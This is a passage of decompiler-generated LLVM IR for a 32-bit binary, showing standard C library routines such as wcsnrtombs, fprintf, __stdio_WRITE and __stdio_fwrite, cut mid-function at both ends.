  %v5_805504e = inttoptr i32 %v0_805504d to i8*
  %v6_805504e = call i32 @__GI_wcsnrtombs(i8* %v5_805504e, i32 %v2_8055048, i32 1, i32 16, i32 %tmp)
  %v1_8055056 = icmp eq i32 %v6_805504e, 0
  %v1_8055058 = icmp eq i1 %v1_8055056, false
  br i1 %v1_8055058, label %dec_label_pc_805505c, label %dec_label_pc_805505a

dec_label_pc_805505a:                             ; preds = %dec_label_pc_8055031
  %v1_805505a = and i32 %v6_805504e, -256
  %v2_805505a = or i32 %v1_805505a, 1
  br label %dec_label_pc_805505c

dec_label_pc_805505c:                             ; preds = %dec_label_pc_8055031, %dec_label_pc_805505a
  %v0_805505f = phi i32 [ %v6_805504e, %dec_label_pc_8055031 ], [ %v2_805505a, %dec_label_pc_805505a ]
  ret i32 %v0_805505f

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
  uselistorder label %dec_label_pc_805505c, { 1, 0 }
  uselistorder label %dec_label_pc_8055031, { 1, 0 }
}

define i32 @__GI_wcsrtombs() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %v5_8055075 = inttoptr i32 %tmp to i8*
  %v6_8055075 = call i32 @__GI_wcsnrtombs(i8* %v5_8055075, i32 %tmp1, i32 -1, i32 %tmp2, i32 %tmp3)
  ret i32 %v6_8055075
}

define i32 @__GI_wcsnrtombs(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_8055083 = load i32, i32* @ebx, align 4
  %v4_8055087 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8055087, i32* %edx.global-to-local, align 4
  store i32 %arg2, i32* %ebp.global-to-local, align 4
  store i32 %arg4, i32* %eax.global-to-local, align 4
  %v1_8055093 = icmp eq i8* %arg1, null
  br i1 %v1_8055093, label %dec_label_pc_80550c7.thread, label %dec_label_pc_8055097

dec_label_pc_8055097:                             ; preds = %entry
  store i32 1, i32* %edi.global-to-local, align 4
  %v12_805509c = icmp eq i32 %v4_8055087, %arg2
  %v1_805509e = icmp eq i1 %v12_805509c, false
  br i1 %v1_805509e, label %dec_label_pc_80550c7, label %dec_label_pc_80550c1

dec_label_pc_80550c7.thread:                      ; preds = %entry
  store i32 0, i32* %edi.global-to-local, align 4
  %v2_80550a4 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_80550a4, i32* %edx.global-to-local, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  store i32 %arg3, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80550d1

dec_label_pc_80550ad:                             ; preds = %dec_label_pc_80550d8
  %v1_80550ad = call i32 @__errno_location(i32 %v0_8055083)
  store i32 %v1_80550ad, i32* %eax.global-to-local, align 4
  %v1_80550b2 = inttoptr i32 %v1_80550ad to i32*
  store i32 84, i32* %v1_80550b2, align 4
  br label %dec_label_pc_80550fe

dec_label_pc_80550bd:                             ; preds = %dec_label_pc_80550df
  store i32 0, i32* %esi.global-to-local, align 4
  %v0_80550f3.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80550ef

dec_label_pc_80550c1:                             ; preds = %dec_label_pc_8055097
  store i32 0, i32* %edi.global-to-local, align 4
  %v2_80550c3 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_80550c3, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80550c7

dec_label_pc_80550c7:                             ; preds = %dec_label_pc_8055097, %dec_label_pc_80550c1
  %v2_80550df15 = phi i32 [ %v4_8055087, %dec_label_pc_8055097 ], [ %v2_80550c3, %dec_label_pc_80550c1 ]
  store i32 %arg3, i32* %ebx.global-to-local, align 4
  %tmp33 = icmp ult i32 %arg4, %arg3
  br i1 %tmp33, label %dec_label_pc_80550cf, label %dec_label_pc_80550d1

dec_label_pc_80550cf:                             ; preds = %dec_label_pc_80550c7
  store i32 %arg4, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80550d1

dec_label_pc_80550d1:                             ; preds = %dec_label_pc_80550c7.thread, %dec_label_pc_80550c7, %dec_label_pc_80550cf
  %v2_80550df1532 = phi i32 [ %v2_80550df15, %dec_label_pc_80550c7 ], [ %v2_80550df15, %dec_label_pc_80550cf ], [ %v2_80550a4, %dec_label_pc_80550c7.thread ]
  %v0_80550d4 = phi i32 [ %arg3, %dec_label_pc_80550c7 ], [ %arg4, %dec_label_pc_80550cf ], [ %arg3, %dec_label_pc_80550c7.thread ]
  %v1_80550d1 = inttoptr i32 %arg2 to i32*
  %v2_80550d1 = load i32, i32* %v1_80550d1, align 4
  store i32 %v2_80550d1, i32* %esi.global-to-local, align 4
  store i32 %v0_80550d4, i32* @ecx, align 4
  %v1_80550eb3 = icmp eq i32 %v0_80550d4, 0
  %v1_80550ed10 = icmp eq i1 %v1_80550eb3, false
  br i1 %v1_80550ed10, label %dec_label_pc_80550d8, label %dec_label_pc_80550ef

dec_label_pc_80550d8:                             ; preds = %dec_label_pc_80550d1, %dec_label_pc_80550e5
  %v2_80550df = phi i32 [ %v2_80550e8, %dec_label_pc_80550e5 ], [ %v2_80550df1532, %dec_label_pc_80550d1 ]
  %v0_80550d8 = phi i32 [ %v1_80550e5, %dec_label_pc_80550e5 ], [ %v2_80550d1, %dec_label_pc_80550d1 ]
  %v1_80550d8 = inttoptr i32 %v0_80550d8 to i32*
  %v2_80550d8 = load i32, i32* %v1_80550d8, align 4
  store i32 %v2_80550d8, i32* %eax.global-to-local, align 4
  %v6_80550dd = icmp ugt i32 %v2_80550d8, 127
  br i1 %v6_80550dd, label %dec_label_pc_80550ad, label %dec_label_pc_80550df

dec_label_pc_80550df:                             ; preds = %dec_label_pc_80550d8
  %v1_80550df = trunc i32 %v2_80550d8 to i8
  %v3_80550df = inttoptr i32 %v2_80550df to i8*
  store i8 %v1_80550df, i8* %v3_80550df, align 1
  %v0_80550e1 = load i32, i32* %eax.global-to-local, align 4
  %v3_80550e1 = trunc i32 %v0_80550e1 to i8
  %v4_80550e1 = icmp eq i8 %v3_80550e1, 0
  br i1 %v4_80550e1, label %dec_label_pc_80550bd, label %dec_label_pc_80550e5

dec_label_pc_80550e5:                             ; preds = %dec_label_pc_80550df
  %v0_80550e5 = load i32, i32* %esi.global-to-local, align 4
  %v1_80550e5 = add i32 %v0_80550e5, 4
  store i32 %v1_80550e5, i32* %esi.global-to-local, align 4
  %v0_80550e8 = load i32, i32* %edx.global-to-local, align 4
  %v1_80550e8 = load i32, i32* %edi.global-to-local, align 4
  %v2_80550e8 = add i32 %v1_80550e8, %v0_80550e8
  store i32 %v2_80550e8, i32* %edx.global-to-local, align 4
  %v0_80550ea = load i32, i32* @ecx, align 4
  %v1_80550ea = add i32 %v0_80550ea, -1
  %v8_80550ea = icmp eq i32 %v1_80550ea, 0
  store i32 %v1_80550ea, i32* @ecx, align 4
  %v1_80550ed = icmp eq i1 %v8_80550ea, false
  br i1 %v1_80550ed, label %dec_label_pc_80550d8, label %dec_label_pc_80550ef

dec_label_pc_80550ef:                             ; preds = %dec_label_pc_80550e5, %dec_label_pc_80550d1, %dec_label_pc_80550bd
  %v0_80550f7 = phi i32 [ 0, %dec_label_pc_80550bd ], [ %v2_80550d1, %dec_label_pc_80550d1 ], [ %v1_80550e5, %dec_label_pc_80550e5 ]
  %v0_80550f3 = phi i32 [ %v0_80550f3.pre, %dec_label_pc_80550bd ], [ %v2_80550df1532, %dec_label_pc_80550d1 ], [ %v2_80550e8, %dec_label_pc_80550e5 ]
  %v2_80550ef = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_80550ef, i32* %eax.global-to-local, align 4
  %v12_80550f3 = icmp eq i32 %v0_80550f3, %v2_80550ef
  br i1 %v12_80550f3, label %dec_label_pc_80550fa, label %dec_label_pc_80550f7

dec_label_pc_80550f7:                             ; preds = %dec_label_pc_80550ef
  %v1_80550f7 = load i32, i32* %ebp.global-to-local, align 4
  %v2_80550f7 = inttoptr i32 %v1_80550f7 to i32*
  store i32 %v0_80550f7, i32* %v2_80550f7, align 4
  br label %dec_label_pc_80550fa

dec_label_pc_80550fa:                             ; preds = %dec_label_pc_80550ef, %dec_label_pc_80550f7
  %v0_80550fa = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_80550fa, i32* %eax.global-to-local, align 4
  %v1_80550fc = load i32, i32* @ecx, align 4
  %v2_80550fc = sub i32 %v0_80550fa, %v1_80550fc
  br label %dec_label_pc_80550fe

dec_label_pc_80550fe:                             ; preds = %dec_label_pc_80550ad, %dec_label_pc_80550fa
  %storemerge1 = phi i32 [ %v2_80550fc, %dec_label_pc_80550fa ], [ -1, %dec_label_pc_80550ad ]
  store i32 %storemerge1, i32* %eax.global-to-local, align 4
  store i32 %v0_8055083, i32* @ebx, align 4
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i32 %v2_80550e8, { 0, 2, 1 }
  uselistorder i32 %v1_80550e5, { 0, 2, 1 }
  uselistorder i32 %v2_80550d1, { 1, 0, 2 }
  uselistorder i32 %v0_80550d4, { 1, 0 }
  uselistorder i32 %v2_80550df1532, { 1, 0 }
  uselistorder i32 %v4_8055087, { 1, 0, 2 }
  uselistorder i32* %esi.global-to-local, { 0, 2, 3, 1 }
  uselistorder i32* %edx.global-to-local, { 0, 4, 1, 3, 2, 5 }
  uselistorder i32* %edi.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %ebx.global-to-local, { 2, 1, 3, 0 }
  uselistorder i32* %eax.global-to-local, { 2, 0, 1, 3, 4, 6, 5, 7 }
  uselistorder i32 127, { 3, 1, 7, 4, 5, 8, 2, 0, 6 }
  uselistorder i32 %arg4, { 2, 1, 0, 3 }
  uselistorder i32 %arg3, { 0, 1, 3, 4, 2 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80550fe, { 1, 0 }
  uselistorder label %dec_label_pc_80550fa, { 1, 0 }
  uselistorder label %dec_label_pc_80550d8, { 1, 0 }
  uselistorder label %dec_label_pc_80550d1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80550c7, { 1, 0 }
}

define i32 @fprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_12 = alloca i32, align 4
  %v2_805510b = ptrtoint i32* %stack_var_12 to i32
  %v0_8055113 = load i32, i32* @edx, align 4
  %v4_805511d = inttoptr i32 %arg1 to i16*
  %v5_805511d = call i32 @__GI_vfprintf(i16* %v4_805511d, i32 %arg2, i32 %v2_805510b, i32 %v0_8055113)
  ret i32 %v5_805511d
}

define i32 @__stdio_WRITE(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %v0_8055129 = load i32, i32* @edi, align 4
  %v0_805512b = load i32, i32* @ebx, align 4
  %v4_805512f = ptrtoint i16* %arg1 to i32
  store i32 %v4_805512f, i32* @edi, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  store i32 %arg3, i32* @ebx, align 4
  %v1_805513b4 = icmp eq i32 %arg3, 0
  br i1 %v1_805513b4, label %dec_label_pc_805519a, label %dec_label_pc_8055140.lr.ph

dec_label_pc_8055140.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_8055140

dec_label_pc_8055140:                             ; preds = %dec_label_pc_805515f.dec_label_pc_8055140_crit_edge, %dec_label_pc_8055140.lr.ph
  %v0_8055150 = phi i32 [ %v4_805512f, %dec_label_pc_8055140.lr.ph ], [ %v0_8055150.pre, %dec_label_pc_805515f.dec_label_pc_8055140_crit_edge ]
  %v0_805514f = phi i32 [ %arg2, %dec_label_pc_8055140.lr.ph ], [ %v2_8055161, %dec_label_pc_805515f.dec_label_pc_8055140_crit_edge ]
  %v0_8055142.in = phi i32 [ %arg3, %dec_label_pc_8055140.lr.ph ], [ %v2_805515f, %dec_label_pc_805515f.dec_label_pc_8055140_crit_edge ]
  %v0_8055142 = icmp slt i32 %v0_8055142.in, 0
  store i32 %v0_8055142.in, i32* %ebp.global-to-local, align 4
  %v2_8055142 = icmp eq i1 %v0_8055142, false
  %storemerge = select i1 %v2_8055142, i32 %v0_8055142.in, i32 2147483647
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v1_8055150 = add i32 %v0_8055150, 4
  %v2_8055150 = inttoptr i32 %v1_8055150 to i32*
  %v3_8055150 = load i32, i32* %v2_8055150, align 4
  %tmp36 = inttoptr i32 %v0_805514f to i32*
  %v5_8055153 = call i32 @__libc_write(i32 %v3_8055150, i32* %tmp36, i32 %storemerge)
  store i32 %v5_8055153, i32* %eax.global-to-local, align 4
  %v2_805515b = icmp slt i32 %v5_8055153, 0
  br i1 %v2_805515b, label %dec_label_pc_8055165, label %dec_label_pc_805515f

dec_label_pc_805515f:                             ; preds = %dec_label_pc_8055140
  %v0_805515f = load i32, i32* @ebx, align 4
  %v2_805515f = sub i32 %v0_805515f, %v5_8055153
  %v12_805515f = icmp eq i32 %v2_805515f, 0
  store i32 %v2_805515f, i32* @ebx, align 4
  %v0_8055161 = load i32, i32* %esi.global-to-local, align 4
  %v2_8055161 = add i32 %v0_8055161, %v5_8055153
  store i32 %v2_8055161, i32* %esi.global-to-local, align 4
  br i1 %v12_805515f, label %dec_label_pc_805519a, label %dec_label_pc_805515f.dec_label_pc_8055140_crit_edge

dec_label_pc_805515f.dec_label_pc_8055140_crit_edge: ; preds = %dec_label_pc_805515f
  %v0_8055150.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8055140

dec_label_pc_8055165:                             ; preds = %dec_label_pc_8055140
  %v0_8055165 = load i32, i32* @edi, align 4
  %v1_8055165 = add i32 %v0_8055165, 8
  %v2_8055165 = inttoptr i32 %v1_8055165 to i32*
  %v3_8055165 = load i32, i32* %v2_8055165, align 4
  store i32 %v3_8055165, i32* @edx, align 4
  %v1_8055168 = add i32 %v0_8055165, 12
  %v2_8055168 = inttoptr i32 %v1_8055168 to i32*
  %v3_8055168 = load i32, i32* %v2_8055168, align 4
  store i32 %v3_8055168, i32* %eax.global-to-local, align 4
  %v1_805516b = inttoptr i32 %v0_8055165 to i16*
  %v2_805516b = load i16, i16* %v1_805516b, align 2
  %v3_805516b = or i16 %v2_805516b, 8
  store i16 %v3_805516b, i16* %v1_805516b, align 2
  %v0_805516f = load i32, i32* %eax.global-to-local, align 4
  %v1_805516f = load i32, i32* @edx, align 4
  %v2_805516f = sub i32 %v0_805516f, %v1_805516f
  %v12_805516f = icmp eq i32 %v2_805516f, 0
  store i32 %v2_805516f, i32* %eax.global-to-local, align 4
  %v4_8055196.pre = load i32, i32* @ebx, align 4
  br i1 %v12_805516f, label %dec_label_pc_8055196, label %dec_label_pc_8055173

dec_label_pc_8055173:                             ; preds = %dec_label_pc_8055165
  %v6_8055175 = icmp ugt i32 %v2_805516f, %v4_8055196.pre
  br i1 %v6_8055175, label %dec_label_pc_8055179.preheader, label %dec_label_pc_8055177

dec_label_pc_8055177:                             ; preds = %dec_label_pc_8055173
  store i32 %v2_805516f, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8055179.preheader

dec_label_pc_8055179.preheader:                   ; preds = %dec_label_pc_8055177, %dec_label_pc_8055173
  %v0_8055179.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8055179

dec_label_pc_8055179:                             ; preds = %dec_label_pc_8055179.preheader, %dec_label_pc_805518b
  %v2_805517b = phi i32 [ %v1_805516f, %dec_label_pc_8055179.preheader ], [ %v1_8055187, %dec_label_pc_805518b ]
  %v4_8055179 = phi i32 [ %v2_805516f, %dec_label_pc_8055179.preheader ], [ %v0_805517d, %dec_label_pc_805518b ]
  %v0_8055179 = phi i32 [ %v0_8055179.pre, %dec_label_pc_8055179.preheader ], [ %v1_805518b, %dec_label_pc_805518b ]
  %v1_8055179 = inttoptr i32 %v0_8055179 to i8*
  %v2_8055179 = load i8, i8* %v1_8055179, align 1
  %v3_8055179 = zext i8 %v2_8055179 to i32
  %v5_8055179 = and i32 %v4_8055179, -256
  %v6_8055179 = or i32 %v3_8055179, %v5_8055179
  store i32 %v6_8055179, i32* %eax.global-to-local, align 4
  %v3_805517b = inttoptr i32 %v2_805517b to i8*
  store i8 %v2_8055179, i8* %v3_805517b, align 1
  %v0_805517d = load i32, i32* %eax.global-to-local, align 4
  %v1_805517d = trunc i32 %v0_805517d to i8
  %v10_805517d = icmp eq i8 %v1_805517d, 10
  %v1_805517f = icmp eq i1 %v10_805517d, false
  br i1 %v1_805517f, label %dec_label_pc_8055187, label %dec_label_pc_8055181

dec_label_pc_8055181:                             ; preds = %dec_label_pc_8055179
  %v0_8055181 = load i32, i32* @edi, align 4
  %v1_8055181 = add i32 %v0_8055181, 1
  %v2_8055181 = inttoptr i32 %v1_8055181 to i8*
  %v3_8055181 = load i8, i8* %v2_8055181, align 1
  %v4_8055181 = urem i8 %v3_8055181, 2
  %v5_8055181 = icmp eq i8 %v4_8055181, 0
  %v1_8055185 = icmp eq i1 %v5_8055181, false
  br i1 %v1_8055185, label %dec_label_pc_8055181.dec_label_pc_805518e_crit_edge, label %dec_label_pc_8055187

dec_label_pc_8055181.dec_label_pc_805518e_crit_edge: ; preds = %dec_label_pc_8055181
  %v0_805518e.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_805518e

dec_label_pc_8055187:                             ; preds = %dec_label_pc_8055181, %dec_label_pc_8055179
  %v0_8055187 = load i32, i32* @edx, align 4
  %v1_8055187 = add i32 %v0_8055187, 1
  store i32 %v1_8055187, i32* @edx, align 4
  %v0_8055188 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8055188 = add i32 %v0_8055188, -1
  %v8_8055188 = icmp eq i32 %v1_8055188, 0
  store i32 %v1_8055188, i32* %ebp.global-to-local, align 4
  br i1 %v8_8055188, label %dec_label_pc_8055187.dec_label_pc_805518e_crit_edge, label %dec_label_pc_805518b

dec_label_pc_8055187.dec_label_pc_805518e_crit_edge: ; preds = %dec_label_pc_8055187
  %v1_805518e.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_805518e

dec_label_pc_805518b:                             ; preds = %dec_label_pc_8055187
  %v0_805518b = load i32, i32* %esi.global-to-local, align 4
  %v1_805518b = add i32 %v0_805518b, 1
  store i32 %v1_805518b, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8055179

dec_label_pc_805518e:                             ; preds = %dec_label_pc_8055187.dec_label_pc_805518e_crit_edge, %dec_label_pc_8055181.dec_label_pc_805518e_crit_edge
  %v1_805518e = phi i32 [ %v0_8055181, %dec_label_pc_8055181.dec_label_pc_805518e_crit_edge ], [ %v1_805518e.pre, %dec_label_pc_8055187.dec_label_pc_805518e_crit_edge ]
  %v0_805518e = phi i32 [ %v0_805518e.pre, %dec_label_pc_8055181.dec_label_pc_805518e_crit_edge ], [ %v1_8055187, %dec_label_pc_8055187.dec_label_pc_805518e_crit_edge ]
  %v2_805518e = add i32 %v1_805518e, 16
  %v3_805518e = inttoptr i32 %v2_805518e to i32*
  store i32 %v0_805518e, i32* %v3_805518e, align 4
  %v0_8055191 = load i32, i32* @edx, align 4
  %v1_8055191 = load i32, i32* @edi, align 4
  %v2_8055191 = add i32 %v1_8055191, 8
  %v3_8055191 = inttoptr i32 %v2_8055191 to i32*
  %v4_8055191 = load i32, i32* %v3_8055191, align 4
  %v5_8055191 = sub i32 %v0_8055191, %v4_8055191
  store i32 %v5_8055191, i32* @edx, align 4
  %v0_8055194 = load i32, i32* @ebx, align 4
  %v2_8055194 = sub i32 %v0_8055194, %v5_8055191
  br label %dec_label_pc_8055196

dec_label_pc_8055196:                             ; preds = %dec_label_pc_8055165, %dec_label_pc_805518e
  %v4_8055196 = phi i32 [ %v2_8055194, %dec_label_pc_805518e ], [ %v4_8055196.pre, %dec_label_pc_8055165 ]
  %v5_8055196 = sub i32 %arg3, %v4_8055196
  br label %dec_label_pc_805519a

dec_label_pc_805519a:                             ; preds = %dec_label_pc_805515f, %entry, %dec_label_pc_8055196
  %stack_var_12.0 = phi i32 [ %v5_8055196, %dec_label_pc_8055196 ], [ 0, %entry ], [ %arg3, %dec_label_pc_805515f ]
  store i32 %stack_var_12.0, i32* %eax.global-to-local, align 4
  store i32 %v0_805512b, i32* @ebx, align 4
  store i32 %v0_8055129, i32* @edi, align 4
  ret i32 %stack_var_12.0

; uselistorder directives
  uselistorder i32 %stack_var_12.0, { 1, 0 }
  uselistorder i32 %v1_805518b, { 1, 0 }
  uselistorder i32 %v1_8055188, { 1, 0 }
  uselistorder i32 %v1_8055187, { 0, 2, 1 }
  uselistorder i32 %v0_805517d, { 1, 0 }
  uselistorder i32 %v2_8055161, { 1, 0 }
  uselistorder i32 %v2_805515f, { 1, 2, 0 }
  uselistorder i32 %v5_8055153, { 0, 2, 1, 3 }
  uselistorder i32* %esi.global-to-local, { 0, 2, 4, 1, 3, 5 }
  uselistorder i32* %ebp.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32 (i32, i32*, i32)* @__libc_write, { 2, 0, 1 }
  uselistorder i32 %arg3, { 0, 3, 1, 2, 4 }
  uselistorder label %dec_label_pc_805519a, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8055196, { 1, 0 }
  uselistorder label %dec_label_pc_8055179, { 1, 0 }
}

define i32 @__stdio_fwrite(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_80551a8 = load i32, i32* @ebp, align 4
  %v0_80551a9 = load i32, i32* @edi, align 4
  %v0_80551aa = load i32, i32* @esi, align 4
  %v0_80551ab = load i32, i32* @ebx, align 4
  store i32 %v0_80551ab, i32* %stack_var_-16, align 4
  store i32 %arg3, i32* @ebx, align 4
  store i32 %arg1, i32* @ebp, align 4
  store i32 %arg2, i32* @edi, align 4
  %v1_80551bb = add i32 %arg3, 1
  %v2_80551bb = inttoptr i32 %v1_80551bb to i8*
  %v3_80551bb = load i8, i8* %v2_80551bb, align 1
  %v4_80551bb = and i8 %v3_80551bb, 2
  %v5_80551bb = icmp eq i8 %v4_80551bb, 0
  %v1_80551bf = icmp eq i1 %v5_80551bb, false
  br i1 %v1_80551bf, label %dec_label_pc_8055276, label %dec_label_pc_80551c5

dec_label_pc_80551c5:                             ; preds = %entry
  %v1_80551c5 = add i32 %arg3, 4
  %v2_80551c5 = inttoptr i32 %v1_80551c5 to i32*
  %v3_80551c5 = load i32, i32* %v2_80551c5, align 4
  %v13_80551c5 = icmp eq i32 %v3_80551c5, -2
  %v1_80551c9 = add i32 %arg3, 16
  %v2_80551c9 = inttoptr i32 %v1_80551c9 to i32*
  %v3_80551c9 = load i32, i32* %v2_80551c9, align 4
  store i32 %v3_80551c9, i32* @edx, align 4
  %v1_80551cc = add i32 %arg3, 12
  %v2_80551cc = inttoptr i32 %v1_80551cc to i32*
  %v3_80551cc = load i32, i32* %v2_80551cc, align 4
  %v1_80551cf = icmp eq i1 %v13_80551c5, false
  %v2_80551ef = sub i32 %v3_80551cc, %v3_80551c9
  store i32 %v2_80551ef, i32* %eax.global-to-local, align 4
  br i1 %v1_80551cf, label %dec_label_pc_80551ef, label %dec_label_pc_80551d1

dec_label_pc_80551d1:                             ; preds = %dec_label_pc_80551c5
  %tmp22 = icmp ult i32 %v2_80551ef, %arg2
  br i1 %tmp22, label %dec_label_pc_80551d9, label %dec_label_pc_80551db

dec_label_pc_80551d9:                             ; preds = %dec_label_pc_80551d1
  br label %dec_label_pc_80551db

dec_label_pc_80551db:                             ; preds = %dec_label_pc_80551d1, %dec_label_pc_80551d9
  %storemerge = phi i32 [ %v2_80551ef, %dec_label_pc_80551d9 ], [ %arg2, %dec_label_pc_80551d1 ]
  %v0_80551dc = phi i32 [ %v2_80551ef, %dec_label_pc_80551d9 ], [ %arg2, %dec_label_pc_80551d1 ]
  store i32 %storemerge, i32* @esi, align 4
  %v3_80551df = inttoptr i32 %v3_80551c9 to i16*
  %v4_80551df = call i32 @memcpy(i16* %v3_80551df, i32 %v0_80551dc, i32 %v2_80551ef)
  store i32 %v4_80551df, i32* %eax.global-to-local, align 4
  %v0_80551e4 = load i32, i32* @ebx, align 4
  %v1_80551e4 = add i32 %v0_80551e4, 16
  %v2_80551e4 = inttoptr i32 %v1_80551e4 to i32*
  %v3_80551e4 = load i32, i32* %v2_80551e4, align 4
  %v4_80551e4 = load i32, i32* @esi, align 4
  %v5_80551e4 = add i32 %v4_80551e4, %v3_80551e4
  store i32 %v5_80551e4, i32* %v2_80551e4, align 4
  br label %dec_label_pc_805528e

dec_label_pc_80551ef:                             ; preds = %dec_label_pc_80551c5
  %v6_80551f3 = icmp ult i32 %v2_80551ef, %arg2
  br i1 %v6_80551f3, label %dec_label_pc_805525d, label %dec_label_pc_80551f5

dec_label_pc_80551f5:                             ; preds = %dec_label_pc_80551ef
  %v0_80551f5 = load i32, i32* @ecx, align 4
  %v3_80551f9 = inttoptr i32 %v3_80551c9 to i16*
  %v4_80551f9 = call i32 @memcpy(i16* %v3_80551f9, i32 %arg2, i32 %v0_80551f5)
  store i32 %v4_80551f9, i32* %eax.global-to-local, align 4
  %v0_80551fe = load i32, i32* @ebx, align 4
  %v1_80551fe = add i32 %v0_80551fe, 16
  %v2_80551fe = inttoptr i32 %v1_80551fe to i32*
  %v3_80551fe = load i32, i32* %v2_80551fe, align 4
  %v4_80551fe = load i32, i32* @edi, align 4
  %v5_80551fe = add i32 %v4_80551fe, %v3_80551fe
  store i32 %v5_80551fe, i32* %v2_80551fe, align 4
  %v0_8055204 = load i32, i32* @ebx, align 4
  %v1_8055204 = add i32 %v0_8055204, 1
  %v2_8055204 = inttoptr i32 %v1_8055204 to i8*
  %v3_8055204 = load i8, i8* %v2_8055204, align 1
  %v4_8055204 = urem i8 %v3_8055204, 2
  %v5_8055204 = icmp eq i8 %v4_8055204, 0
  br i1 %v5_8055204, label %dec_label_pc_805528e, label %dec_label_pc_805520e

dec_label_pc_805520e:                             ; preds = %dec_label_pc_80551f5
  %v0_805520e = load i32, i32* @edx, align 4
  %v0_805520f = load i32, i32* @edi, align 4
  %v4_8055213 = call i32 @memrchr(i8 10, i32 %v0_805520f, i32 %v0_805520e)
  store i32 %v4_8055213, i32* %eax.global-to-local, align 4
  %v1_805521b = icmp eq i32 %v4_8055213, 0
  br i1 %v1_805521b, label %dec_label_pc_805528e, label %dec_label_pc_805521f

dec_label_pc_805521f:                             ; preds = %dec_label_pc_805520e
  %v0_8055222 = load i32, i32* @ebx, align 4
  %v1_8055223 = call i32 @__stdio_wcommit(i32 %v0_8055222)
  store i32 %v1_8055223, i32* %eax.global-to-local, align 4
  %v1_805522b = icmp eq i32 %v1_8055223, 0
  br i1 %v1_805522b, label %dec_label_pc_805528e, label %dec_label_pc_805522f

dec_label_pc_805522f:                             ; preds = %dec_label_pc_805521f
  %v0_805522f = load i32, i32* @edi, align 4
  %tmp23 = icmp ugt i32 %v0_805522f, %v1_8055223
  br i1 %tmp23, label %dec_label_pc_8055235, label %dec_label_pc_8055237

dec_label_pc_8055235:                             ; preds = %dec_label_pc_805522f
  br label %dec_label_pc_8055237

dec_label_pc_8055237:                             ; preds = %dec_label_pc_805522f, %dec_label_pc_8055235
  %storemerge24 = phi i32 [ %v1_8055223, %dec_label_pc_8055235 ], [ %v0_805522f, %dec_label_pc_805522f ]
  %v0_805523e = phi i32 [ %v1_8055223, %dec_label_pc_8055235 ], [ %v0_805522f, %dec_label_pc_805522f ]
  store i32 %storemerge24, i32* %esi.global-to-local, align 4
  %v2_8055239 = sub i32 %v0_805522f, %v0_805523e
  store i32 %v2_8055239, i32* %eax.global-to-local, align 4
  %v0_805523b = load i32, i32* @ebp, align 4
  %v2_805523b = add i32 %v0_805523b, %v2_8055239
  store i32 %v2_805523b, i32* %ebp.global-to-local, align 4
  %v4_8055242 = call i32 @__GI_memchr(i8* inttoptr (i32 10 to i8*), i32 %v0_805523e, i32 %v2_8055239)
  store i32 %v4_8055242, i32* %eax.global-to-local, align 4
  store i32 %v4_8055242, i32* @edx, align 4
  %v1_805524c = icmp eq i32 %v4_8055242, 0
  br i1 %v1_805524c, label %dec_label_pc_805528e, label %dec_label_pc_8055250

dec_label_pc_8055250:                             ; preds = %dec_label_pc_8055237
  %v0_8055250 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8055250 = load i32, i32* %esi.global-to-local, align 4
  %v2_8055250 = sub i32 %v0_8055250, %v4_8055242
  %v2_8055254 = add i32 %v2_8055250, %v1_8055250
  store i32 %v2_8055254, i32* %eax.global-to-local, align 4
  %v0_8055256 = load i32, i32* @ebx, align 4
  %v1_8055256 = add i32 %v0_8055256, 16
  %v2_8055256 = inttoptr i32 %v1_8055256 to i32*
  %v3_8055256 = load i32, i32* %v2_8055256, align 4
  %v5_8055256 = sub i32 %v3_8055256, %v2_8055254
  store i32 %v5_8055256, i32* %v2_8055256, align 4
  %v0_8055259 = load i32, i32* @edi, align 4
  %v1_8055259 = load i32, i32* %eax.global-to-local, align 4
